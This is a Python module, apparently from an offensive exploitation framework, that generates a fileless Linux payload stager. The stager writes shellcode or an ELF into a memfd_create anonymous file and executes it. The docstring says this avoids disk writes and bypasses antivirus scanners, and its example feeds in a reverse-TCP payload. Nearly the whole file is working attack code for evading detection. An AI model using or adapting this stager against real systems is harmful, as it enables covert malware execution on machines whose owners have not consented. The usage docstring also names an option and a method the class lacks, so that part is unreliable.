"""Fileless Linux Payload — memfd_create execution.

Executa shellcode/ELF em arquivo anônimo de memória (sem toque em disco).
Bypassa scanners de filesystem (ClamAV, Sophos, etc.).
Requer: Linux kernel >= 3.17 (memfd_create syscall).

Uso:
    payload = Payload()
    payload.options["SHELLCODE"]["value"] = open("reverse_tcp.bin","rb").read().hex()
    shellcode_bytes = bytes.fromhex(payload.generate_shellcode())
    # ou: injetar via exploit em processo já comprometido
"""

import ctypes
import os
from embedxpl.core.exploit.payloads import BasePayload


_NR_MEMFD_CREATE = 319  # x86_64; ARM64=279, ARM=385, MIPS=4354


class Payload(BasePayload):
    __info__ = {
        "name": "Fileless memfd_create",
        "description": "Execute ELF/shellcode from anonymous memory — zero disk footprint.",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
        "references": [
            "https://man7.org/linux/man-pages/man2/memfd_create.2.html",
            "https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html",
        ],
    }

    options = {
        "SHELLCODE_HEX": {
            "description": "Hex-encoded payload (ELF binary or raw shellcode)",
            "required": True,
            "default": "",
            "value": "",
        },
        "MFD_NAME": {
            "description": "Name for memfd (appears in /proc/<pid>/maps)",
            "required": False,
            "default": ".",
            "value": ".",
        },
    }

    def generate(self) -> bytes:
        """Gera stager Python que executa via memfd_create."""
        mfd_name = self.options["MFD_NAME"]["value"]
        sc_hex = self.options["SHELLCODE_HEX"]["value"]

        stager = f"""#!/usr/bin/env python3
import ctypes,os,sys
MFD_CLOEXEC=1
sc=bytes.fromhex("{sc_hex}")
name=b"{mfd_name}\\x00"
libc=ctypes.CDLL(None)
fd=libc.syscall({_NR_MEMFD_CREATE},ctypes.c_char_p(name),ctypes.c_uint(MFD_CLOEXEC))
if fd<0:sys.exit(1)
os.write(fd,sc)
os.execve("/proc/self/fd/"+str(fd),["{mfd_name}"],os.environ)
"""
        return stager.encode()

    def run_local(self, shellcode: bytes) -> int:
        """Executa o payload localmente via memfd_create (para testes)."""
        MFD_CLOEXEC = 1
        libc = ctypes.CDLL(None)
        name = b".\x00"
        fd = libc.syscall(_NR_MEMFD_CREATE, ctypes.c_char_p(name), ctypes.c_uint(MFD_CLOEXEC))
        if fd < 0:
            raise OSError("memfd_create failed")
        os.write(fd, shellcode)
        # Note: os.execve replaces current process
        os.execve(f"/proc/self/fd/{fd}", ["."], os.environ)
